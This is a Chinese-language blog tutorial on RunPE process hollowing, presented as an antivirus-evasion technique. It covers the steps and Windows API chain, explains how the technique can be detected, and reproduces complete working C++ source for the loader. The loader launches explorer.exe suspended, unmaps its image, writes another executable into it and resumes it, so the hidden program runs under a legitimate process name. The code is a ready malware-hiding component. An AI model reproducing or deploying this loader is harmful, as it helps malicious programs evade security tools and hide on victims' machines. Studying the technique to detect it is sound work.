# 0x01 RunPE 技巧

>一些古老的免杀技巧不一定能过现代检测，主要是学习其思路，招式多了才能灵活运用。


这是一种古老的免杀技巧，核心是进程隐藏：

1. 选择一个受害系统中已开启的进程；
2. 创建一个此进程的新实例作为傀儡进程，以挂起状态启动；
3. 修改新实例的内存，清除（磁盘文件 PE.exe 映射到）内存中所有节区（通过 NtUnmapViewOfSection 实现）；
4. 重新分配内存（基地址不变，但可能分配更多内存）为了在其中复制自己的代码，注意 preferred address 不变；
5. 将恶意 PE 的 PE 头+PE 体复制到新分配的内存中，注意调整 ModuleEntryPoint 去匹配新偏移；
6. 恢复进程的主线程。


**优势：**

可以做到隐藏进程。在进程查看器中看到的是一个进程，实际上实现的功能是另一个恶意 PE 的功能。




# 0x02 API 链分析：


>注：以实现 calc.exe 功能为例，也就是假设恶意 pe 为 calc.exe；

1. 解析恶意 PE calc.exe 的 PE 结构；
2. `CreateProcess` API 创建状态为 SUSPENDED 的 explorer.exe 实例（原文在此是创建了一个 Process 类，实现了 CreateWithFlags 这个方法。经查看完全就是 CreateProcess 的功能）；
3. `VirtualAlloc` 第一次为此进程初始化分配内存空间，权限为 `MEM_COMMIT` `PAGE_READWRITE`；
4. `GetThreadContext` API 检索新创建 explorer 进程实例的上下文，第二个参数传入上一步中分配的内存区域，也就是读这个目标进程的有效上下文；
5. `ReadProcessMemory` 获取目标进程的基地址（具体实现是第二个参数传入基地址的指针，然后从第三个参数接收返回值）；
6. 微软未文档化的 API `NtUnmapViewOfSection`，这个 API 的功能是 This function unmaps a previously created view to a section，实际上就是通过 NtUnmapViewOfSection 清空新进程的内存数据；
7. 注：这种未文档化的 API 没有关联的导入库，所以使用时必须先通过 LoadLibrary 和 GetProcAddress 函数动态链接到 Ntdll.dll。参考：[MSDN - RtlNtStatusToDosError function](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-rtlntstatustodoserror)；
8. 如果清空新进程内存数据成功，实际上也就是把原本的 explorer.exe 代码取消映射到内存中。然后再次使用 `VirtualAllocEx` API 为恶意 PE 重新分配内存；
9. 通过作者自己实现的 PE 类的中一些函数，获取恶意 PE 的头信息；
10. 调用 `WriteProcessMemory` API 去写这些恶意 PE 的 PE 头信息；
11. 通过作者自己实现的 PE 类的中一些函数，获取恶意 PE 的节区数据，写入一个缓冲区；
11. 再次调用 `WriteProcessMemory` API，一次性写入 PE 的各个节区的数据；
12. 调用 `SetThreadContext` API 设置 32位线程的上下文，呼应一开始的 GetThreadContext API，传入的第一个参数依然是进程实例的句柄，第二个参数是已被写入恶意 PE 内容的通过第3步分配的内存空间；
13.  `ResumeThread` 恢复主线程，开始执行恶意 PE；
14.  CloseHandle 关闭进程句柄；
15.  CloseHandle 关闭主线程句柄。


# 0x03 缺点分析

在实际操作时候，可以把 PE 换成 shellcode。但是还是更适合 exe 类型的恶意载荷，因为我们都知道，shellcode 的特点是：


- 独立的存在，无需任何文件格式的包装。
- 内存中运行，无需固定指定的宿主进程。

本文中介绍的这种 RunPE 方法，严重破坏原本的 PE 结构。检测时候仅仅需要对比磁盘上的 PE 头和内存中的 PE 头，就可以很好的检测出来。如果是 shellcode，用注入更合适，就可以不破坏 PE 本身的 PE 头，不会被检测出来。



# 0x04 源码实现

这个源码是原作者写的，我一并附上。作者为了避免被人开箱即用做坏事，专门定义了两个类：

- PE 类
- Process 类

PE 类主要实现了解析恶意 PE 结构，获取原 PE 文件的信息，写入恶意 PE 数据等功能，读者可以自行去 MSDN 寻找可替换 API。

至于 Process 类，我在第二部分的 API 分析中已经替换为 CreateProcess API 了，此类实现的功能较为简单，可以直接忽略。







```
//RunPE.cpp
void RunPe( wstring const& target, wstring const& source )
{
    Pe src_pe( source );        // Parse source PE structure
    if ( src_pe.isvalid )
    {        
        Process::CreationResults res = Process::CreateWithFlags( target, L"", CREATE_SUSPENDED, false, false ); // Start a suspended instance of target
        if ( res.success )
        {
            PCONTEXT CTX = PCONTEXT( VirtualAlloc( NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE ) );   // Allocate space for context
            CTX->ContextFlags = CONTEXT_FULL;

            if ( GetThreadContext( res.hThread, LPCONTEXT( CTX ) ) )    // Read target context
            {
                DWORD dwImageBase;
                ReadProcessMemory( res.hProcess, LPCVOID( CTX->Ebx + 8 ), LPVOID( &dwImageBase ), 4, NULL );        // Get base address of target
                
                typedef LONG( WINAPI * NtUnmapViewOfSection )(HANDLE ProcessHandle, PVOID BaseAddress);
                NtUnmapViewOfSection xNtUnmapViewOfSection;
                xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
                if ( 0 == xNtUnmapViewOfSection( res.hProcess, PVOID( dwImageBase ) ) )  // Unmap target code
                {
                    LPVOID pImageBase = VirtualAllocEx(res.hProcess, LPVOID(dwImageBase), src_pe.NtHeadersx86.OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);  // Realloc for source code
                    if ( pImageBase )
                    {
                        Buffer src_headers( src_pe.NtHeadersx86.OptionalHeader.SizeOfHeaders );                 // Read source headers
                        PVOID src_headers_ptr = src_pe.GetPointer( 0 );
                        if ( src_pe.ReadMemory( src_headers.Data(), src_headers_ptr, src_headers.Size() ) )
                        {
                            if ( WriteProcessMemory(res.hProcess, pImageBase, src_headers.Data(), src_headers.Size(), NULL) )   // Write source headers
                            {
                                bool success = true;
                                for (u_int i = 0; i < src_pe.sections.size(); i++)     // Write all sections
                                {
                                    // Get pointer on section and copy the content
                                    Buffer src_section( src_pe.sections.at( i ).SizeOfRawData );
                                    LPVOID src_section_ptr = src_pe.GetPointer( src_pe.sections.at( i ).PointerToRawData );
                                    success &= src_pe.ReadMemory( src_section.Data(), src_section_ptr, src_section.Size() );                                    

                                    // Write content to target
                                    success &= WriteProcessMemory(res.hProcess, LPVOID(DWORD(pImageBase) + src_pe.sections.at( i ).VirtualAddress), src_section.Data(), src_section.Size(), NULL);
                                }

                                if ( success )
                                {
                                    WriteProcessMemory( res.hProcess, LPVOID( CTX->Ebx + 8 ), LPVOID( &pImageBase), sizeof(LPVOID), NULL );      // Rewrite image base
                                    CTX->Eax = DWORD( pImageBase ) + src_pe.NtHeadersx86.OptionalHeader.AddressOfEntryPoint;        // Rewrite entry point
                                    SetThreadContext( res.hThread, LPCONTEXT( CTX ) );                                              // Set thread context
                                    ResumeThread( res.hThread );                                                                    // Resume main thread
                                }                               
                            }
                        }                       
                    }
                }
            }

            if ( res.hProcess) CloseHandle( res.hProcess );
            if ( res.hThread ) CloseHandle( res.hThread );
        }
    }
}
...
RunPe( L"C:\\windows\\explorer.exe", L"C:\\windows\\system32\\calc.exe" );
```


------------


参考文档：

1. [RunPE: How to hide code behind a legit process](https://www.adlice.com/runpe-hide-code-behind-legit-process/?__cf_chl_jschl_tk__=5f1ebd15eb3b055970bcb17c07f958e0b0ce529e-1596768269-0-ASo8oOjVCky_6EASW8kW-ynLbDB_shuMUtvEL8qhuf4w1u7yd7fp0SGBTZChFn8qZeBpqU_UrkMK34eJJJNQFDL6T8RGeYMP2abQMEnBgHtXwgv66ANGXTAUB94y9e_kkuz0awp1sdDZ898L06vvXyMdq0lEzAD3CeigouuUNjzg2KTUAObPGoK4uiB8sTsdJN3uFZTKiUyj-U1ST1uAE_3Pfs8dsLCJm6MXC9fJQu3LTDi49nse49rQy7QUbpNBVGh_4qNHra8Jps5izT2-x-mzpI1Yt3F_suHWqfC7kwehNmv8dJgtiAKpuIcWW_9J9KMibFnTK7Nv7JOY32vmSTXy2tIMtLG7HqMiP-VuMgSWFsOzB0QZQjUMuvEghdzGxA)，tigzy，Adlice.com，2015-06-10
2. [RemoteFreeLibrary](https://www.zcgonvh.com/post/RemoteFreeLibrary.html)，zcgonvh，草泥马之家，2019-10-26（主要参考里面未文档化 API 的用法，如 `RtlCreateUserThread`、`RtlNtStatusToDosError`）